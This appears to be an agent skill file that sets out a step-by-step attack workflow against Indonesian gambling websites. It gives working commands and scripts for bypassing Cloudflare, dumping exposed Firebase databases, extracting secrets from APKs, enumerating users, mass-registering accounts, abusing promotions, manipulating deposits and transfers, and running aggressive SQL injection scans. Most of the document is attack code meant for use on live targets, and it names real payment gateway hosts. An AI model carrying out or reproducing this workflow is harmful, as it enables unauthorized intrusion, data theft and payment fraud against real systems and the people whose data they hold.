---
name: judol-hunting
description: "Full judol (Indonesian gambling) hunting workflow: target discovery → CF bypass → recon → enumerate → exploit. Covers ONIX/Laravel platforms, Firebase leaks, APK RE, payment manipulation."
tags: [judol, hunting, web, cloudflare, laravel, onix, firebase, apk, indonesia, gambling]
---

# Judol Hunting — Full Workflow

## Target Profile
- **Platform**: ONIX gambling backend (Laravel + MongoDB)
- **TLD**: .xyz, .top, .icu, .online, .site, .fun, .club, .vip, .pw, .monster, .buzz
- **Engine**: Cocos2d-JS (mobile), Laravel (web)
- **Payment**: VaderPay, Help2Pay, QRIS, DANA, OVO, Gopay
- **CDN**: Cloudflare (always), Alibaba Cloud (Tengine)

---

## PHASE 1: TARGET DISCOVERY

### 1a. Low-TLD Scanning
```bash
# Focus on cheap, less-regulated TLDs
subfinder -d TARGET.xyz -silent
crt.sh → https://crt.sh/?q=%.TARGET.xyz
```

### 1b. Tech Detection
```bash
nuclei -u https://TARGET -t technologies/ -severity info
whatweb https://TARGET
```

### 1c. Firebase Config Leak (APK)
```bash
# Download APK from Play Store or APK mirror
# Extract google-services.json
unzip -p TARGET.apk assets/google-services.json
# Check: project_id, api_key, database_url, storage_bucket
```

---

## PHASE 2: CF BYPASS (ALWAYS FIRST)

### 2a. FlareSolverr (Primary)
```bash
# Start FlareSolverr
docker run -d --name flaresolverr -p 8191:8191 flaresolverr/flaresolverr:latest

# Create persistent session (CRITICAL for CSRF)
curl -s http://localhost:8191/v1 -X POST \
  -H "Content-Type: application/json" \
  -d '{"cmd":"sessions.create"}'

# GET with session (maintains cookies + CSRF)
curl -s http://localhost:8191/v1 -X POST \
  -H "Content-Type: application/json" \
  -d '{"cmd":"request.get","url":"https://TARGET","session":"SESSION_ID","maxTimeout":60000}'
```

### 2b. Playwright+Stealth (Fallback)
```python
# tools/web/playwright_stealth_get.py
python3 tools/web/playwright_stealth_get.py https://TARGET
```

### 2c. Cookie Extraction
```bash
# If CF cookies obtained, use directly
curl -s https://TARGET -b "cf_clearance=COOKIE; __cf_bm=COOKIE"
```

---

## PHASE 3: RECON

### 3a. API Endpoint Discovery
```bash
# FFUF with common judol paths
ffuf -u https://TARGET/FUZZ -w wordlist.txt -mc 200,301,302,405

# Common judol endpoints:
# /login, /register, /deposit, /withdraw, /transfer
# /api/login, /api/register, /api/deposit
# /checkExistingEmail, /checkUserNameAvailability
# /profile, /promotion, /referral
```

### 3b. JS Analysis
```bash
# Download and analyze JS files
curl -s https://TARGET/main.js | grep -oE '"/[a-zA-Z][a-zA-Z0-9/._-]+"'
# Look for: API endpoints, Firebase config, WebSocket URLs, auth tokens
```

### 3c. Firebase Database
```bash
# Check RTDB (often READ OPEN)
curl -s "https://PROJECT.firebaseio.com/.json"
curl -s "https://PROJECT.firebaseio.com/.json?shallow=true"

# Common paths: /users, /config, /agents, /merchants, /update
```

### 3d. APK Reverse Engineering
```bash
# Decompile with JADX
jadx -d jadx_out TARGET.apk

# Search for secrets
find jadx_out -name "*.java" | xargs grep -l "api_key\|secret\|token\|password"
strings lib/arm64-v8a/libcocos2djs.so | grep -iE "(https?://|api|key|secret|token)"
```

---

## PHASE 4: ENUMERATE

### 4a. Username Enumeration (Login Error Messages)
```python
# Different errors = user exists
# "tidak terdaftar" → NOT registered
# "password salah" → EXISTS
r = s.post(f"{BASE}/login", data={"user_name": "admin", "password": "wrong"})
if "tidak terdaftar" in r.text:
    print("NOT EXISTS")
elif "salah" in r.text:
    print("EXISTS!")
```

### 4b. Email Enumeration
```python
# POST /checkExistingEmail
r = s.post(f"{BASE}/checkExistingEmail", data={"email": "admin@TARGET.com"})
# true = exists, false = not exists
```

### 4c. Config Leak via /register
```python
# GET /register often returns full JSON config
r = s.get(f"{BASE}/register")
data = r.json()
# Leaks: banks, ewallets, OTP disabled, honeypot, admin usernames
```

### 4d. CSRF Token Bypass
```python
# GET /ajaxCSRFToken (often works without auth)
r = s.get(f"{BASE}/ajaxCSRFToken")
csrf = r.json()["data"]
# Use as X-CSRF-TOKEN header or _token in POST body
```

---

## PHASE 5: EXPLOIT

### 5a. Mass Registration (if OTP disabled)
```python
# Check if OTP disabled in /register config
reg = requests.get(f"{BASE}/register").json()["data"]
if reg.get("is_disable_otp"):
    # Register multiple accounts
    for i in range(10):
        reg_data = {
            "user_name": f"exploit{i:03d}",
            "password": "Exploit2026!",
            "password_confirmation": "Exploit2026!",
            "email": f"exploit{i}@pm.me",
            "acc_name": "Test User",
            "acc_no": "081298765" + str(i),
            "bank_id": "BANK_MONGODB_ID",
            "register_token": reg.get("register_token"),
            "_token": csrf,
        }
        # Fill honeypot correctly
        for f in reg.get("honeypot", {}).get("fields", []):
            if f.get("selected"):
                reg_data[f["name"]] = f["value"]
            else:
                reg_data[f["name"]] = ""
        
        s.post(f"{BASE}/register", data=reg_data)
```

### 5b. Bonus/Referral Abuse
```python
# Get promo list
r = s.get(f"{BASE}/promotion")
promos = r.json()["data"]["banners"]

# Claim all promos
for promo in promos:
    s.post(f"{BASE}/promo/claim", data={"promo_id": promo["id"], "_token": csrf})

# Get referral code
r = s.get(f"{BASE}/referral")
ref_code = r.json()["data"]["ref_code"]
```

### 5c. Payment Manipulation
```python
# Try mass assignment on deposit
s.post(f"{BASE}/deposit", data={
    "amount": -100000,  # Negative
    "_token": csrf
})

# Try balance transfer with 0 balance
s.post(f"{BASE}/transfer", data={
    "amount": 100000,
    "to_user": "exploit001",
    "_token": csrf
})
```

### 5d. SQLi (if applicable)
```bash
# Test with sqlmap
sqlmap -u "https://TARGET/login" --data="user_name=test&password=test" \
  --batch --risk=3 --level=5 --threads=4
```

---

## PHASE 6: INFRASTRUCTURE MAPPING

### 6a. Payment Gateway
```python
# Check payment gateway URLs from Firebase
gateways = [
    "http://stgapicurr.seamlesss-hptech.com/api/",
    "http://stgpay.ug396-api.com/Help2pay/Deposit",
    "https://stageapi.vaderpay.net/",
]
for gw in gateways:
    r = requests.get(gw, timeout=10)
    print(f"{gw} → {r.status_code}")
```

### 6b. Subdomain Enumeration
```bash
# Find all subdomains
subfinder -d seamlesss-hptech.com -silent
# Common: admin, stg, api, pay, merchant, gateway
```

---

## TOOLS REFERENCE

| Tool | Purpose | Command |
|------|---------|---------|
| FlareSolverr | CF bypass | `docker run -p 8191:8191 flaresolverr/flaresolverr` |
| Playwright+Stealth | Browser bypass | `python3 tools/web/playwright_stealth_get.py URL` |
| web_hunter.py | Target discovery | `python3 tools/web/web_hunter.py` |
| sqlmap | SQLi | `sqlmap -u URL --batch` |
| ffuf | Fuzzing | `ffuf -u URL/FUZZ -w wordlist` |
| nuclei | Vuln scan | `nuclei -u URL -t templates/` |
| subfinder | Subdomain | `subfinder -d DOMAIN` |
| jadx | APK decompile | `jadx -d out TARGET.apk` |

---

## COMMON JUDOL PATTERNS

### ONIX Platform Headers
```python
headers = {
    "x-api-key": "LEAKED_KEY",
    "d-key": "LEAKED_DKEY",  # e.g., CS2ABA0
    "domain_key": "LEAKED_DKEY",
    "agent_id": "LEAKED_DKEY",
    "X-Requested-With": "XMLHttpRequest",
}
```

### Firebase RTDB Pattern
```
https://APP_NAME-default-rtdb.firebaseio.com/.json
https://APP_NAME-default-rtdb.asia-southeast1.firebasedatabase.app/.json
```

### Payment Gateway Pattern
```
http://stgapicurr.seamlesss-hptech.com/api/
http://stgpay.ug396-api.com/Help2pay/Deposit
https://stageapi.vaderpay.net/
```

---

## DECISION TREE

```
Target URL
  ├─ CF detected? → FlareSolverr → Playwright → Cookie
  ├─ Laravel? → Check /register (config leak)
  │   ├─ OTP disabled? → Mass register
  │   └─ OTP enabled? → Username enum → Brute force
  ├─ ONIX platform? → Check Firebase RTDB
  │   ├─ READ OPEN? → Dump all data
  │   └─ READ closed? → APK RE for keys
  ├─ Has API? → Check Swagger/docs
  │   ├─ Exposed? → Enumerate endpoints
  │   └─ Protected? → Token bypass
  └─ Mobile app? → jadx decompile
      ├─ Firebase config? → Extract keys
      └─ Hardcoded secrets? → Extract tokens
```
